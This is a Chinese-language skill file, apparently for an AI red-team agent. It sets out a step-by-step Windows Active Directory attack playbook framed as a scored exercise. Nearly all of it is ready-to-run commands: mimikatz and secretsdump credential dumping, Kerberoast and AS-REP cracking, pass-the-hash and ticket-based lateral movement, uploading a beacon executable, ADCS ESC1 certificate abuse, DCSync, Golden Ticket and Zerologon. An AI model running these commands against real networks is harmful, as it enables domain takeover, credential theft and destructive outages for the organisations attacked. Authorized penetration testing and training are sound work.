---
name: windows-ad-attack
description: Windows 与域环境攻击：域内枚举、凭据提取、Kerberoast/AS-REP、PtH/WMI/SMB 横向、ADCS 与域控路径
whenToUse: 内网出现 445/88/389/5985 端口，或已拿到域用户哈希/票据，需要横向到更多主机与域控
role: internal
enabled: true
---

# Windows / 域攻击（从一台机器到整个域）

Windows 内网的得分点密度最高：**一台机器上的哈希能横到一片**，域控权限直接对应最高分。
顺序永远是：**枚举 → 凭据 → 复用 → 提权 → 域控**。别一上来就 mimikatz。

## 一、先判断"在不在域里"

```bash
# 从 Linux 侧（走隧道，技能 suo5-tunnel）
nltest /dsgetdc:<domain> 2>/dev/null            # Windows 上执行
enum4linux-ng -A <target>                        # 域/工作组、用户、共享一次摸清
impacket-GetADUsers -all -dc-ip <DC_IP> <domain>/<user>:<pass>
# 端口指纹：88=Kerberos（域）、389/636=LDAP、445=SMB、5985=WinRM、1433/3389
nmap -Pn -p 88,135,139,389,445,5985,5986,3389,1433 <cidr> --open
```

- 有 88 + 389 → **域环境**，重点打 AD；
- 只有 445/3389 → 工作组，重点打**共享、弱口令、RDP 影子会话、本机提权**。

## 二、凭据提取（拿到第一组凭据后一切好办）

```bash
# 1) 内存里的明文/哈希（需管理员）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# 不带 mimikatz 落盘时：remote 拉取 lsass（会触发 EDR，慎）
impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<pass>@<DC_IP>
impacket-secretsdump <domain>/<user>:<pass>@<target>       # 本地 SAM/LSA/SECRETS
# 2) 浏览器/配置文件里的凭据（不用管理员权限，性价比最高）
#    Chrome: Login Data（SQLite）→ 用 DPAPI 解密；RDP: cmdkey /list
# 3) 域内 GPP 密码（老环境常见，一条命令一把钥匙）
impacket-Get-GPPPassword <domain>/<user>:<pass>@<DC_IP>
```

> **纪律**：`secretsdump` 全量拉 NTDS 会产生巨大流量与日志，先 `-just-dc-user` 按需取；
> 只取验证所需的账号，别把整个域哈希拖回本地。

## 三、Kerberos 两条"离线爆破"路（不需要管理员）

```bash
# Kerberoast：任何域用户都能请求服务票据，离线破 RC4
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerb.hash
hashcat -m 13100 runs/kerb.hash wordlist.txt -r rules/best64.rule        # TGS-REP etype23

# AS-REP Roast：不需要预认证的账号（UserAccountControl 置位）
impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -usersfile runs/users.txt -format hashcat -outputfile runs/asrep.hash
hashcat -m 18200 runs/asrep.hash wordlist.txt                            # AS-REP etype23
```

命中即拿到该账号明文 → 记 `account`/`domain-user` 权限，立刻用它继续枚举（`GetADUsers`、BloodHound）。

## 四、横向（有哈希就能走）

```bash
# Pass-the-Hash（SMB）
impacket-psexec -hashes :<nthash> <domain>/<user>@<target>
impacket-wmiexec -hashes :<nthash> <domain>/<user>@<target> "whoami"
impacket-smbexec -hashes :<nthash> <domain>/<user>@<target>
# WinRM（5985，最安静）
evil-winrm -i <target> -u <user> -H <nthash>
# 票据（拿到 TGT/TGS 后）
export KRB5CCNAME=runs/user.ccache
impacket-psexec -k -no-pass <domain>/<user>@<target>
# 远程执行与文件传输
smbclient //<target>/C$ -U '<domain>/<user>%<pass>' -c 'put runs/beacon.exe'
```

**横向节制**：同一账号连续登录大量主机会触发"密码喷洒/横向"告警，**按需一台一台来**，
每台都留 `redteam_access_add` 记录（主机 / 账号 / 权限级别）。

## 五、ADCS（证书服务，现代域里最好用）

```bash
# 枚举模板与 CA（找 ESC1：模板允许请求者在 SAN 里指定任意用户）
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC_IP> -vulnerable -stdout
# ESC1 利用：以 Administrator 身份申请证书 → 拿域管票据
certipy req -u <user>@<domain> -p <pass> -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

拿到域管 hash/票据即 `domain-admin` 级别成果——**这是报告里最有分量的一行**。

## 六、域控路径（有权限才走，别硬打）

1. **DCSync**（需要 Replicating Directory Changes 权限）：
   `impacket-secretsdump -just-dc <domain>/<user>:<pass>@<DC_IP>` → 拿 krbtgt 与域管哈希；
2. **Golden Ticket**（拿到 krbtgt 后）：`ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain <domain> administrator`；
3. **Zerologon（CVE-2020-1472）**：会把域控机器账号密码置空，**破坏性极强**，
   只在演练明确允许且能立刻恢复时使用；
4. **GPO 下发**：有 GPO 写权限时可给全域下发计划任务（影响面大，先与指挥确认）。

## 七、本机提权（没有域权限时的备选）

```powershell
whoami /priv                     # SeImpersonate → PrintSpoofer / GodPotato
whoami /groups                   # 是否在 Administrators（但 UAC 未提权）
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# 服务/计划任务/可写目录
accesschk.exe -uwcqv "Everyone" * /accepteula
# 未加引号的服务路径、可写的服务二进制 → 替换后重启服务
```

工具：`winPEASx64.exe`、`PowerUp.ps1`（`Invoke-AllChecks`）、`Seatbelt.exe`。

## 八、落地与纪律

1. **先拿入口再谈提权**：能把哈希横到下一台，就不要在本机研究内核 exp。
2. **不装持久化后门**（除非演练明确要求）：计划任务/服务/注册表 Run 都是"事故级"痕迹。
3. **不触碰业务数据库**：域管权限用于证明"能控域"，不是用来改数据的。
4. **凭据分级记录**：域用户 / 本机管理员 / 域管理员，三级对应不同得分点，别混着报。
5. **导出文件统一放 `runs/`**：哈希、票据、pfx 都别散落在目标机上。

## 九、落库（强制）

1. 每台拿下主机：`redteam_access_add`（`target`、`account`、`level=admin/system`、`method=PtH/WinRM`）。
2. 凭据：`redteam_credential_add`（`type=hash/ticket/plain`，`source` 写来源，
   `tool` 写实际命令；**明文密码才写 `secret_value`**）。
3. 权限得分：`redteam_score_hit`（`account` / `domain-admin` / `server-host`，`target` 带端口，
   `evidence` 写"哪台机器、什么权限、怎么验证的"）。
4. 横向路径：`redteam_chain_add`（`stage_code=internal`，`tool` 写命令、`result` 写回显）。
5. 域内发现（域控 IP、CA、OU 结构）写进资产 `surface`，供后续角色直接用。
